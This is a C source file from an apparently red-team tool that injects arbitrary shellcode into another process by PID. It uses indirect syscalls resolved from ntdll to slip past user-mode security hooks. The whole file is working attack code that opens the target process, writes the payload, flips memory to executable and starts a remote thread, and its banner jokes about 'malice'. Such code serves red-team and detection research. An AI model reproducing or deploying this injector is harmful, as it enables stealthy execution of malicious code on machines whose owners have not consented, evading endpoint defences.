#include "injection.h"

VOID PrintBanner(VOID) {
    printf(
        "     ____        ___             __    ____                  ____                              \n"
        "    /  _/__  ___/ (_)______ ____/ /_  / __/_ _____ _______ _/ / /__                            \n"
        "   _/ // _ \\/ _  / / __/ -_) __/ __/ _\\ \\/ // (_-</ __/ _ `/ / (_-<                         \n"
        "  /___/_//_/\\_,_/_/_/  \\__/\\__/\\__/ /___/\\_, /___/\\__/\\_,_/_/_/___/                     \n"
        "                                        /___/                                                \n\n"
        "  /*!                                                                                          \n"
        "   * made with love and a bit of malice <3                                                     \n"
        "   * -> https://www.crow.rip, @cr-0w, crow@crow.rip                                            \n"
        "   *                                                                                           \n"
        "   * disclaimer: I am not the author of this technique, this is just *my* implementation of it.\n"
        "   * warning: I am not responsible for what you do with this program. use this responsibly!    \n"
        "   * enjoy, nerds. lots o' luv.                                                                \n"
        "   */                                                                                        \n\n"
    );
}

VOID IndirectPrelude(
    _In_  HMODULE NtdllHandle,
    _In_  LPCSTR NtFunctionName,
    _Out_ PDWORD NtFunctionSSN,
    _Out_ PUINT_PTR NtFunctionSyscall
) {

    DWORD SyscallNumber = 0;
    UINT_PTR NtFunctionAddress = 0;
    UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };
    
    NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (0 == NtFunctionAddress) {
        WARN("[GetProcAddress] failed, error: 0x%lx", GetLastError());
        return;
    }

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
    *NtFunctionSyscall = NtFunctionAddress + 0x12;

    /* making memcmp happy */
    if (memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes)) == 0) {
        INFO("[0x%p] [0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, (PVOID)*NtFunctionSyscall, *NtFunctionSSN, NtFunctionName);
        return;
    }

    else {
        WARN("expected syscall signature: \"0x0f05\" didn't match.");
        return;
    }

}

BOOL IndirectSyscallsInjection(
    _In_ CONST DWORD PID,
    _In_ CONST PBYTE Payload,
    _In_ CONST SIZE_T PayloadSize
) {

    BOOL      State         = TRUE;
    PVOID     Buffer        = NULL;
    HANDLE    ThreadHandle  = NULL;
    HANDLE    ProcessHandle = NULL;
    HMODULE   NtdllHandle   = NULL;
    DWORD     OldProtection = 0;
    SIZE_T    BytesWritten  = 0;
    NTSTATUS  Status        = 0;
    CLIENT_ID CID           = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA    = { sizeof(OA),  NULL };

    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        WARN("[GetModuleHandleW] failed, error: 0x%lx", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);

    IndirectPrelude(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall);
    IndirectPrelude(NtdllHandle, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN, &g_NtAllocateVirtualMemorySyscall);
    IndirectPrelude(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN, &g_NtWriteVirtualMemorySyscall);
    IndirectPrelude(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN, &g_NtProtectVirtualMemorySyscall);
    IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
    IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall);
    IndirectPrelude(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN, &g_NtFreeVirtualMemorySyscall);
    IndirectPrelude(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall);

    Status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtOpenProcess", Status);
        return FALSE; /* no point in continuing if we can't even get a handle on the process */
    }
    OKAY("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);

    Status = NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtAllocateVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a %zu-byte buffer with PAGE_READWRITE [RW-] permissions!", Buffer, PayloadSize);

    Status = NtWriteVirtualMemory(ProcessHandle, Buffer, Payload, PayloadSize, &BytesWritten);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtWriteVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer!", Buffer, BytesWritten);

    Status = NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtProtectVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", Buffer);

    Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtCreateThreadEx", Status);
        State = FALSE; goto CLEANUP;
    }

    OKAY("[0x%p] successfully created a thread!", ThreadHandle);
    INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    Status = NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);

CLEANUP:

    if (Buffer) {
        Status = NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
        if (STATUS_SUCCESS != Status) {
            PRINT_ERROR("NtFreeVirtualMemory", Status);
        }
        else {
            INFO("[0x%p] decommitted allocated buffer from process memory", Buffer);
        }
    }

    if (ThreadHandle) {
        NtClose(ThreadHandle);
        INFO("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        NtClose(ProcessHandle);
        INFO("[0x%p] handle on process closed", ProcessHandle);
    }

    return State;

}
